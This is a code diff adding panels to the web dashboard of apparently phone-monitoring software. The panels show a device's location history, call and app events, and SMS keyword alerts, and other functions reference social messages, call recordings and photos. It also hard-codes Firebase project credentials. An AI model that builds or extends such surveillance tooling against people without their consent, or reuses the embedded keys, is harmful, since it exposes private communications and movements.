+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap);
+            } catch(e) { console.warn('Map init:', e); }
+        }, 100);
+    }
+
+    function displayLocationHistory(data) {
+        const listDiv = document.getElementById('historyList');
+        if (!listDiv) return;
+        listDiv.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            listDiv.innerHTML = '<p style="color:#999">No history yet.</p>';
+            return;
+        }
+        if (window._historyMap) {
+            try {
+                const coords = data.map(function(p) { return [p.lat, p.lon]; });
+                if (coords.length > 1) L.polyline(coords, {color:'#1976ff',weight:3}).addTo(window._historyMap);
+                data.forEach(function(p, i) {
+                    L.circleMarker([p.lat, p.lon], {
+                        radius: i === 0 ? 8 : 5,
+                        color: i === 0 ? '#d32f2f' : '#1976ff', fillOpacity: 0.8
+                    }).addTo(window._historyMap)
+                    .bindPopup('<b>' + (p.timeFmt || p.date || '') + '</b><br>' + (p.address || (p.lat.toFixed(4)+','+p.lon.toFixed(4))));
+                });
+                if (coords.length > 0) window._historyMap.setView(coords[0], 13);
+            } catch(e) { console.warn('Map plot:', e); }
+        }
+        const tbl = document.createElement('table');
+        tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:12px;margin-top:12px';
+        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">Time</th><th style="padding:8px;text-align:left">Location</th><th style="padding:8px">Map</th></tr></thead>';
+        const tbody = document.createElement('tbody');
+        data.forEach(function(p) {
+            const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
+            const td1 = document.createElement('td'); td1.style.cssText = 'padding:6px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = p.timeFmt || p.date || '';
+            const td2 = document.createElement('td'); td2.style.padding = '6px 8px'; td2.textContent = p.address || (p.lat.toFixed(4)+', '+p.lon.toFixed(4));
+            const td3 = document.createElement('td'); td3.style.cssText = 'padding:6px 8px;text-align:center';
+            const a = document.createElement('a'); a.href = 'https://maps.google.com/?q='+p.lat+','+p.lon;
+            a.target = '_blank'; a.style.color = '#1976ff'; a.textContent = '📍';
+            td3.appendChild(a); tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
+            tbody.appendChild(tr);
+        });
+        tbl.appendChild(tbody); listDiv.appendChild(tbl);
+    }
+
+    // ---------- FEATURE 5+6: APP EVENTS ----------
+    function showAppEventsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '📦 App & Call Events';
+        panel.appendChild(h3);
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#666;font-size:12px;margin-bottom:12px';
+        note.textContent = 'App installs/removals and call events.';
+        panel.appendChild(note);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                sendCommand('GET_APP_EVENTS', {days: item[1]});
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const listDiv = document.createElement('div'); listDiv.id = 'appEventsList';
+        listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
+        panel.appendChild(listDiv);
+        sendCommand('GET_APP_EVENTS', {days:5});
+    }
+
+    function displayAppEvents(data) {
+        const container = document.getElementById('appEventsList') || panel;
+        container.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            container.innerHTML = '<p style="color:#999">No events yet.</p>'; return;
+        }
+        const iconMap = {
+            'INSTALLED':'📱', 'REMOVED':'🗑️',
+            'CALL_INCOMING':'📞', 'CALL_OUTGOING':'📤', 'CALL_MISSED':'📵'
+        };
+        data.forEach(function(ev) {
+            const row = document.createElement('div');
+            row.style.cssText = 'display:flex;align-items:center;gap:12px;padding:10px;border-bottom:1px solid #f0f0f0';
+            const icon = document.createElement('span'); icon.style.cssText = 'font-size:22px;flex-shrink:0';
+            icon.textContent = iconMap[ev.type] || '📋';
+            const info = document.createElement('div'); info.style.flex = '1';
+            const name = document.createElement('div'); name.style.cssText = 'font-weight:600;font-size:13px';
+            name.textContent = ev.name || ev.pkg || ev.extra || ev.type;
+            const detail = document.createElement('div'); detail.style.cssText = 'font-size:11px;color:#999;margin-top:2px';
+            detail.textContent = (ev.type || '') + (ev.pkg ? '  •  '+ev.pkg : '') + '  •  ' + (ev.timeFmt || ev.date || '');
+            info.appendChild(name); info.appendChild(detail);
+            row.appendChild(icon); row.appendChild(info);
+            container.appendChild(row);
+        });
+    }
+
+    // ---------- FEATURE 8: SMS KEYWORD ALERTS ----------
+    function showSmsKeywordsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🔑 SMS Keyword Alerts';
+        panel.appendChild(h3);
+        const desc = document.createElement('p');
+        desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:14px';
+        desc.textContent = 'Get instant alerts when an incoming SMS contains any of these words.';
+        panel.appendChild(desc);
+        const inputRow = document.createElement('div'); inputRow.style.cssText = 'display:flex;gap:8px;margin-bottom:14px';
+        const inp = document.createElement('input'); inp.id = 'kwInput'; inp.type = 'text';
+        inp.placeholder = 'e.g. drug, fight, bully (comma separated)';
+        inp.style.cssText = 'flex:1;padding:9px 12px;border:1px solid #ddd;border-radius:8px;font-size:13px';
+        const saveBtn = document.createElement('button'); saveBtn.textContent = '💾 Save';
+        saveBtn.style.cssText = 'padding:9px 18px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:600';
+        saveBtn.addEventListener('click', function() {
+            const raw = document.getElementById('kwInput').value.trim();
+            if (!raw) { showNotification('Enter at least one keyword'); return; }
+            const kws = raw.split(',').map(function(k) { return k.trim(); }).filter(function(k) { return k.length > 0; });
+            sendCommand('SET_SMS_KEYWORDS', {keywords: kws});
+        });
+        inputRow.appendChild(inp); inputRow.appendChild(saveBtn); panel.appendChild(inputRow);
+        const ctrlRow = document.createElement('div'); ctrlRow.style.cssText = 'display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap';
+        [['📋 View Current','GET_SMS_KEYWORDS',null,'#1976ff'],
+         ['🗑️ Clear All','CLEAR_SMS_KEYWORDS',null,'#d32f2f'],
+         ['⚠️ View Alerts','GET_SMS_ALERTS',{days:5},'#ff9800']
+        ].forEach(function(item) {
+            const b = document.createElement('button'); b.textContent = item[0];
+            b.style.cssText = 'padding:8px 14px;background:'+item[3]+';color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px';
+            b.addEventListener('click', function() { sendCommand(item[1], item[2] || {}); });
+            ctrlRow.appendChild(b);
+        });
+        panel.appendChild(ctrlRow);
+        const resultDiv = document.createElement('div'); resultDiv.id = 'kwResult';
+        panel.appendChild(resultDiv);
+    }
+
+    function displaySmsKeywords(data) {
+        const div = document.getElementById('kwResult') || panel;
+        div.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            div.innerHTML = '<p style="color:#999">No keywords set.</p>'; return;
+        }
+        const h4 = document.createElement('h4'); h4.style.marginBottom = '10px';
+        h4.textContent = 'Active Keywords (' + data.length + ')';
+        div.appendChild(h4);
+        const tags = document.createElement('div'); tags.style.cssText = 'display:flex;flex-wrap:wrap;gap:8px';
+        data.forEach(function(kw) {
+            const tag = document.createElement('span');
+            tag.style.cssText = 'background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7;border-radius:16px;padding:4px 12px;font-size:13px;font-weight:600';
+            tag.textContent = kw; tags.appendChild(tag);
+        });
+        div.appendChild(tags);
+    }
+
+    function displaySmsAlerts(data) {
+        const div = document.getElementById('kwResult') || panel;
+        div.innerHTML = '';
+        const h4 = document.createElement('h4'); h4.style.marginBottom = '10px';
+        h4.textContent = '⚠️ Alert History (' + (Array.isArray(data) ? data.length : 0) + ')';
+        div.appendChild(h4);
+        if (!Array.isArray(data) || data.length === 0) {
+            div.innerHTML += '<p style="color:#999">No alerts triggered yet.</p>'; return;
+        }
+        data.forEach(function(alert) {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff8e1;border:1px solid #ffcc02;border-radius:8px;padding:10px;margin-bottom:8px';
+            const top = document.createElement('div'); top.style.cssText = 'display:flex;justify-content:space-between;margin-bottom:4px';
+            const kw = document.createElement('span');
+            kw.style.cssText = 'background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700';
+            kw.textContent = alert.keyword;
+            const time = document.createElement('span'); time.style.cssText = 'font-size:11px;color:#999'; time.textContent = alert.timeFmt || alert.date || '';
+            top.appendChild(kw); top.appendChild(time);
+            const from = document.createElement('div'); from.style.cssText = 'font-size:12px;color:#555;margin-top:4px'; from.textContent = 'From: ' + (alert.from || '');
+            const body = document.createElement('div'); body.style.cssText = 'font-size:13px;color:#333;margin-top:4px'; body.textContent = alert.body || alert.message || '';
+            card.appendChild(top); card.appendChild(from); card.appendChild(body);
+            div.appendChild(card);
+        });
+    }
+
+    // ---------- FIREBASE ----------
+    function showFirebaseSettingsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🔥 Firebase Configuration';
+        panel.appendChild(h3);
+        const desc = document.createElement('p');
+        desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:16px;line-height:1.6';
+        desc.innerHTML = 'Enter your Firebase project config.';
+        panel.appendChild(desc);
+        const fbConf = (typeof firebaseConfig !== 'undefined') ? firebaseConfig : {};
+        const fields = [
+            ['apiKey','API Key'],['authDomain','Auth Domain'],['projectId','Project ID'],
+            ['storageBucket','Storage Bucket'],['messagingSenderId','Sender ID'],['appId','App ID']
+        ];
+        const form = document.createElement('div');
+        form.style.cssText = 'display:flex;flex-direction:column;gap:10px;max-width:480px';
+        fields.forEach(function(f) {
+            const wrap = document.createElement('div');
+            const lbl = document.createElement('label');
+            lbl.style.cssText = 'font-size:12px;color:#999;display:block;margin-bottom:3px';
+            lbl.textContent = f[1];
+            const inp = document.createElement('input'); inp.id = 'fb_'+f[0]; inp.type = 'text';
+            inp.value = (fbConf[f[0]] && fbConf[f[0]] !== 'YOUR_API_KEY') ? fbConf[f[0]] : '';
+            inp.placeholder = f[1];
+            inp.style.cssText = 'width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:6px;font-size:13px;box-sizing:border-box';
+            wrap.appendChild(lbl); wrap.appendChild(inp); form.appendChild(wrap);
+        });
+        const saveBtn = document.createElement('button'); saveBtn.textContent = '💾 Save & Connect';
+        saveBtn.style.cssText = 'padding:10px 20px;background:#ff6f00;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin-top:6px';
+        saveBtn.addEventListener('click', function() {
+            const newCfg = {};
+            fields.forEach(function(f) { newCfg[f[0]] = document.getElementById('fb_'+f[0]).value.trim(); });
+            if (!newCfg.projectId) { alert('Enter at least Project ID'); return; }
+            localStorage.setItem('fbConfig', JSON.stringify(newCfg));
+            alert('Saved! Reload page to apply Firebase config.');
+        });
+        panel.appendChild(form); panel.appendChild(saveBtn);
+        const connected = fbConf.apiKey && fbConf.apiKey !== 'YOUR_API_KEY';
+        const status = document.createElement('div');
+        status.style.cssText = 'margin-top:16px;padding:12px;background:#f5f5f5;border-radius:8px;font-size:12px';
+        status.innerHTML = connected
+            ? '<span style="color:#4caf50;font-weight:700">● Firebase Connected</span> — ' + (fbConf.projectId || '')
+            : '<span style="color:#d32f2f;font-weight:700">● Not configured</span> — Enter credentials above';
+        panel.appendChild(status);
+    }
 
     // ---------- ATTACH FUNCTIONS TO WINDOW ----------
     window.toggleScreen = toggleScreen;
@@ -2229,11 +3231,14 @@ window.addEventListener('load', () => {
     window.toggleRecording = toggleRecording;
     window.downloadBase64 = downloadBase64;
     window.gotoPage = gotoPage;
+    window.deleteSelected = deleteSelected;
+    window.updateCounters = updateCounters;
     window.handleFolderClick = handleFolderClick;
     window.navigateUp = navigateUp;
     window.updateSelected = updateSelected;
     window.downloadSelected = downloadSelected;
     window.connectWebSocket = connectWebSocket;
+    window.manualReconnect = manualReconnect;
     window.snapScreen = snapScreenFromModal;
     window.showAppUsagePanel = showAppUsagePanel;
     window.showGeofencePanel = showGeofencePanel;
@@ -2245,11 +3250,48 @@ window.addEventListener('load', () => {
     window.startScheduledCapture = startScheduledCapture;
     window.clearAlerts = clearAlerts;
     window.toggleLiveGps = toggleLiveGps;
+    window.showSocialMessagesPanel  = showSocialMessagesPanel;
+    window.filterSocialByPkg        = filterSocialByPkg;
+    window.showCallRecordingsPanel  = showCallRecordingsPanel;
+    window.showPhotoGalleryPanel    = showPhotoGalleryPanel;
+    window.showLocationHistoryPanel = showLocationHistoryPanel;
+    window.showAppEventsPanel       = showAppEventsPanel;
+    window.showSmsKeywordsPanel     = showSmsKeywordsPanel;
+    window.showFirebaseSettingsPanel = showFirebaseSettingsPanel;
+    window.toggleFlash = toggleFlash; // add flash toggle
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
-    // ---------- START ----------
+    // ---------- INITIALIZE ----------
     connectWebSocket();
+</script>
+
+<!-- Firebase config + Firestore initialisation -->
+<script>
+var firebaseConfig = {
+  apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
+  authDomain: "webviewiot.firebaseapp.com",
+  databaseURL: "https://webviewiot-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "webviewiot",
+  storageBucket: "webviewiot.firebasestorage.app",
+  messagingSenderId: "634777347775",
+  appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
+  measurementId: "G-2KW4EJYTRB"
+};
+
+try {
+    var _saved = localStorage.getItem('fbConfig');
+    if (_saved) Object.assign(firebaseConfig, JSON.parse(_saved));
+} catch(e) {}
+
+if (firebaseConfig.apiKey && firebaseConfig.apiKey !== 'YOUR_API_KEY') {
+    firebase.initializeApp(firebaseConfig);
+    window.firestoreDb = firebase.firestore();
+    firebase.auth().signInAnonymously().catch(function(e) { console.warn('Firebase auth:', e.message); });
+    console.log('Firebase initialised:', firebaseConfig.projectId);
+} else {
+    console.log('Firebase not configured — using WebSocket only');
+}
 </script>
 </body>
 </html>
